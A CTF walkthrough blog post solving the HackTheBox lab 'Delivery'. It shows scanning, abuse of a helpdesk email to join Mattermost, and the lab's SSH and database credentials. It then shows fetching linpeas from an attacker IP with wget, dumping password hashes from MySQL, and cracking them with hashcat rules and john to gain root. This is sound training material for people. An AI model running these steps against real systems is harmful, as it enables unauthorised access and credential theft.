<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/hackthebox/" rel="category tag">HackTheBox</a></span>            </div>
            <h1 class="post-title entry-title">Delivery HackTheBox Walkthrough</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/delivery-hackthebox-walkthrough/" rel="bookmark"><time class="entry-date published" datetime="2021-05-24T18:22:26+00:00">May 24, 2021</time><time class="updated" datetime="2025-06-22T09:18:04+00:00">June 22, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000;">Hello! Everyone and Welcome to yet another CTF challenge from Hack the Box, called ‘Delivery,’ which is available online for those who want to increase their skills in penetration testing and Black box testing. Hack the Box presents Delivery, a retired vulnerable lab that makes online penetration testing practice suitable to your experience level. They offer a large collection of vulnerable labs as challenges ranging from beginner to expert level. The challenge was designed by <a href="https://www.youtube.com/channel/UCa6eh7gCkpPo5XXUDfygQQA">IppSec</a>.</span></p>
<p><span style="color: #000000;"><strong>Level:</strong> Easy</span></p>
<p><span style="color: #000000;"><strong>Task:</strong> Find user.txt and root.txt in the victim’s machine</span></p>
<h3><span style="color: #800000;"><strong>Penetration Methodologies</strong></span></h3>
<ul>
<li><span style="color: #000000;"><strong>Scanning</strong></span></li>
</ul>
<ul>
<li style="list-style-type: none;">
<ul>
<li><span style="color: #000000;">Nmap</span></li>
</ul>
</li>
</ul>
<ul>
<li><span style="color: #000000;"><strong>Enumeration</strong></span></li>
</ul>
<ul>
<li style="list-style-type: none;">
<ul>
<li><span style="color: #000000;"> Using /etc/hosts for custom domain</span></li>
<li><span style="color: #000000;"> Browsing HTTP service</span></li>
<li><span style="color: #000000;">Enumerating email service</span></li>
</ul>
</li>
</ul>
<ul>
<li><span style="color: #000000;"><strong>Exploitation</strong></span></li>
</ul>
<ul>
<li style="list-style-type: none;">
<ul>
<li><span style="color: #000000;"> Extracting database credentials from mattermost  </span></li>
<li><span style="color: #000000;"> Cracking Password using hashcat rule based attack</span></li>
</ul>
</li>
</ul>
<ul>
<li><span style="color: #000000;"><strong>Privilege Escalation</strong></span></li>
</ul>
<ul>
<li style="list-style-type: none;">
<ul>
<li><span style="color: #000000;"> Cracking the password using john the ripper</span></li>
</ul>
</li>
<li><span style="color: #000000;"><strong>Capturing the flag</strong></span></li>
</ul>
<p><span style="color: #000000;"><strong>Walkthrough</strong></span></p>
<h3><span style="color: #800000;">Network Scanning</span></h3>
<p><span style="color: #000000;">Let’s get started then!</span></p>
<p><span style="color: #000000;">To Attack any machine, we need the IP Address. Machine hosted on HackTheBox have a static IP Address.</span></p>
<p><span style="color: #000000;">IP Address assigned to the delivery machine: <strong>10.129.149.209</strong></span></p>
<p><span style="color: #000000;">We have added the IP Address in our /etc/hosts file as delivery.htb to make our enumeration and handling better.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">nano /etc/hosts
10.129.149.209  delivery.htb</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-0I9Zrr_qaqo/YKvqBThMakI/AAAAAAAAwG4/L6BD_CRUrg02vYYgbGLZOXJzbNosCl8pgCLcBGAsYHQ/s16000/2.png"/></span></p>
<p><span style="color: #000000;">Let us scan the VM with the most popular port scanning tool, nmap to enumerate open ports on the machine.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">nmap -p- -A delivery.htb</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-f9gt6zGjREU/YKvp5cn7JbI/AAAAAAAAwG0/xyyC65GjDP8gNMBLLun3casgWVu8r4dygCLcBGAsYHQ/s16000/1.png"/></span></p>
<p><span style="color: #000000;">From the result below we found three working ports on the VM, port SSH(22), HTTP(80) and Unknown(8065). </span><span style="color: #000000;">Since  HTTP service runs on port 80, from nmap results. So, we browse the IP address of Target in the browser. We found a simple HTML page.       </span></p>
<p><span style="color: #000000;">Since we have added the host, we can now see the website in the browser by visiting http://delivery.htb.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-b1RhgTFXbME/YKvqPszmzRI/AAAAAAAAwHE/vKr4s6BCkx4_YHt-7isicwRym6XHAJOxQCLcBGAsYHQ/s16000/3.png"/></span></p>
<p><span style="color: #000000;">We clicked on helpdesk and found another link which is a subdomain for helpdesk. So, we add and update the host file /etc/hosts with <strong>helpdesk.delivery.htb</strong></span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">nano /etc/hosts
10.129.149.79 delivery.htb helpdesk.delivery.htb</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-slIii5ULPbU/YKvqXLm3C4I/AAAAAAAAwHM/yeFZleseVaAq0RxtSRN-tBuNkyBYR6q4wCLcBGAsYHQ/s16000/4.png"/></span></p>
<p><span style="color: #000000;">Since we have added the subdomain, we do further enumeration by visiting the subdomain http://helpdesk.delivery.htb. Which is running a support ticket system web application powered by osticket.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-PpRx6RO0ep0/YKvqb2sFfbI/AAAAAAAAwHQ/5YoYTkvx5x4kPSd04c17WFFHVuTdLgG1QCLcBGAsYHQ/s16000/5.png"/></span></p>
<h3><span style="color: #800000;">Exploiting Mattermost Access</span></h3>
<p><span style="color: #000000;">According to the hint we got before on the contact us page, a valid email should end with @delivery.htb domain to access the mattermost server. Therefore, we try to open a ticket as a guest user.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-t8qPtafNpkU/YKvqiwN905I/AAAAAAAAwHY/6ZIIp3FsM8gaHdpuoFAGi2kZsgDGrp-twCLcBGAsYHQ/s16000/6.png"/></span></p>
<p><span style="color: #000000;">So, it successfully messaged us that our ticket has been created as a guest user and it also provided us with an email (4319594@delivery.htb) that we can reply to directly to further update the ticket on the customer portal.</span></p>
<p><span style="color: #000000;">So, let’s leverage this feature to gain access to mattermost service.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-EBkBzU_FU58/YKvqpWNAUEI/AAAAAAAAwHc/KaZhLTySnuYNxmRNTzXI8GgJRflXU54WgCLcBGAsYHQ/s16000/7.png"/></span></p>
<p><span style="color: #000000;">Based on the hint we got earlier, we need @delivery.htb email to access the mattermost server. So, let’s try to enumerate the mattermost which is running on port 8065. </span><span style="color: #000000;">Here we could see an option to create an account.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-C4FPsyEAOuA/YKvqv35QUII/AAAAAAAAwHg/XBjJnnb--JIuGS05TVsZz-dMDZBBc-_xACLcBGAsYHQ/s16000/8.png"/></span></p>
<p><span style="color: #000000;">So, let’s sign up using the email from the support ticket, (<a style="color: #000000;" href="mailto:4319594@delivery.htb">4319594@delivery.htb</a>) which we received when we opened a new ticket.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-__k1S-0RKJo/YKvq4EiYhyI/AAAAAAAAwHk/kA-CVWXovxkFyNjJouVRbrF_zGJ-kvkJwCLcBGAsYHQ/s16000/9.png"/></span></p>
<p><span style="color: #000000;">To get the confirmation email, we need to access the customer support portal. Let’s go back and use the check ticket option on helpdesk with the ticket id and email <a style="color: #000000;" href="mailto:ignite@delivery.htb">ignite@delivery.htb</a> to retrieve the ticket data we opened.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-dCCx5Y3-lFw/YKvrKB3MRQI/AAAAAAAAwH4/dxScxpFRxckA-uVoHI8cF0EZG3rxKFvtwCLcBGAsYHQ/s16000/10.png"/></span></p>
<p><span style="color: #000000;">Here we can see a confirmation email from mattermost server.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-VZlklyVHCbM/YKvq_RHwXKI/AAAAAAAAwHw/nnFSf2qgCscngobRSFQdch9tzy9xd7vYQCLcBGAsYHQ/s16000/11.png"/></span></p>
<p><span style="color: #000000;">We copy and paste into the browser to activate the email and access mattermost server. Once verified we login and see if we can find something interesting. </span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-INcyrZYQ324/YKvrS9k-kGI/AAAAAAAAwIA/g4iNSV3-IVY3niVK_SmrOGxe4IRsakGiQCLcBGAsYHQ/s16000/12.png"/></span></p>
<p><span style="color: #000000;">On logging in there is a chance to join the internal team, Once joined there is some chat with the root user which has mentioned some SSH credentials in the chat.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-JaFWmLQt-cQ/YKvrYmT4YcI/AAAAAAAAwIE/q7NnV9JitGMU5_vCV7uqPP0T5M9_B9eQQCLcBGAsYHQ/s16000/13.png"/></span></p>
<p><span style="color: #000000;">There is also a message which says to stop “using common password variations because of how easily it can be exploited”. So, let’s first login to server to ssh with credentials.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">Username: maildeliverer
Password: Youve_G0t_Mail!
ssh maildeliverer@10.129.149.209</pre>
<h3><span style="color: #800000;">Privilege Escalation to Root</span></h3>
<p><span style="color: #000000;">Once connected we can see the user.txt flag but we are first focused on getting root flag </span><span style="color: #000000;">so, we immediately ran linpeas to find out some weaknesses in the server.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">cd /tmp
wget 10.10.14.108:8080/linpeas.sh
chmod 777 linpeas.sh</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-JKMBG2uTEgM/YKvrezuMlvI/AAAAAAAAwIM/lgvyVpqhPAQ_YiOndzjo8KCFVU7Uqdk8ACLcBGAsYHQ/s16000/50.png"/></span></p>
<p><span style="color: #000000;">Since user maildeliverer is a basic user with no sudo privileges, However, there is MySQL database running because ticketing system is storing ticket details and while looking at the files we found mattermost service having writeable access and stores its configurations in path /opt/mattermost/ config/config.json.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-FdjvLL4LOUE/YKvrkg5wJfI/AAAAAAAAwIU/HfV4fnuSUwcM4k2YqBLdbT5d0bTPqfHAgCLcBGAsYHQ/s16000/51.png"/></span></p>
<p><span style="color: #000000;">So, after opening the config.json file we found database credentials under SqlSettings.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">cd /opt
ls
cd mattermost
ls
cd config
cat config.json</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-VQ-0jc45rT4/YKvrpUUmiKI/AAAAAAAAwIc/RtkHmqaZxSg8MyDlxVx0OU29RJGA0GhigCLcBGAsYHQ/s16000/52.png"/></span></p>
<p><span style="color: #000000;">The database credentials are:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">Username: mmuser
Password: Crack_The_MM_Admin_PW</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-HlpjnRQJVAQ/YKvruAoYA3I/AAAAAAAAwIg/_JB5tDKyoZ827LKpuf6R_LVriL8J5GbtwCLcBGAsYHQ/s16000/53.png"/></span></p>
<p><span style="color: #000000;">We connect to the database with the credentials we have found in mattermost config.json using the command below.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">mysql -h 127.0.0.1 -u'mmuser' -p</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-BEb6Z8xSb3g/YKvrzvP7-KI/AAAAAAAAwIk/ZLfcldRpYfga-KbNshT7-mSC8d9M7xM3ACLcBGAsYHQ/s16000/54.png"/></span></p>
<p><span style="color: #000000;">We check all the database available and here we only found default and mattermost database so we use mattermost database and check tables.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">show database;
use mattermost;
show tables;</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-rXIIdFc-pIU/YKvr7WQFwGI/AAAAAAAAwIw/rKykpWkmQ70nbxFWnv-LDcUyRwLkujnTwCLcBGAsYHQ/s16000/55.png"/></span></p>
<p><span style="color: #000000;">Since we found many tables, but we will go with user table which looks interesting so let’s check if we can find some root credentials.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">select Username, password from Users;</pre>
<p><span style="color: #000000;">As we should only be interested in root user but the problem here is that the password is in the hash. </span><span style="color: #000000;">Save the password in a file called <strong>hash.</strong></span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-H6bExMjBNhA/YKvsAs1RNlI/AAAAAAAAwI4/HpOrbdSkmpQg3DV1A7crxxQNRC3iKq3KwCLcBGAsYHQ/s16000/56.png"/></span></p>
<p><span style="color: #000000;">Previously a hint was given in chat by the root user that the password should be a variant of PleaseSubscribe! So, we created a custom wordlist instead on using rockyou.txt</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-gflD8vAPfRw/YKvsE23w5TI/AAAAAAAAwJA/quImaUFqmZoXvz3pRES4C7KCczcxE2OeACLcBGAsYHQ/s16000/57.png"/></span></p>
<p><span style="color: #000000;">We saved PleaseSubscribe! in a file, then created a custom variant using hashcat, there are many in /usr/share/hashcat/rules, so let’s start with the one called “best”.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">nano file
cat file
hashcat -r /usr/share/hashcat/rules/best64.rule --stdout file &gt; dict.txt</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-8I-HEEITWnI/YKvsPGRkCxI/AAAAAAAAwJE/sJytumjgFcIfoU5mifEStG_V_Tlw6_1tQCLcBGAsYHQ/s16000/58.png"/></span></p>
<p><span style="color: #000000;">Once our dictionary is created, we can use it to crack the hash with john the ripper.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">john --wordlist=/root/dict.txt hash</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-yjDM7uIoeRw/YKvsW4RrRZI/AAAAAAAAwJQ/2cUaC7yNgCUgTO4M3UnARZTuxb620RxfACLcBGAsYHQ/s16000/59.png"/></span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">su root
PleaseSubscribe!21
cd /root
cat root.txt</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-vv5avkrX6zU/YKvsbARPGCI/AAAAAAAAwJU/PXhefQ3m5zwHamVhNPmQFRP1lhJJvIAfgCLcBGAsYHQ/s16000/60.png"/></span></p>
<p><span style="color: #000000;">Thank you for giving your precious time to read this walkthrough. I hope you have enjoyed and learned something new today. If you want to read more HTB Write-ups. Follow this</span> <strong><a href="https://www.hackingarticles.in/category/ctf-challenges/hackthebox/">Link.</a></strong> <span style="color: #000000;">Happy Hacking!</span></p>
<p><span style="color: #000000;"><strong>Author: Prabhjot Dunglay</strong> is a Cyber Security Enthusiast with 2 years of experience in Penetration Testing at Hacking Articles, Ignite technologies. Contact <strong><span style="color: #0000ff;"><a style="color: #0000ff;" href="https://www.linkedin.com/in/prabhjotdunglay">here</a></span></strong>.</span></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
